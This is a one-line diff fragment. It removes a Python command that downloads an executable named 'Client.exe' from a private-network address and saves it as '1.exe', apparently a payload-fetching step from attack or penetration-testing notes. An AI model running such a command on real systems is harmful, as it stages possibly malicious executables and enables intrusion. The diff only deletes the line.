@@ -1,1 +1,0 @@
-	>python -c 'import urllib;urllib.urlretrieve("http://192.168.1.192/Client.exe","/path/to/save/1.exe")'
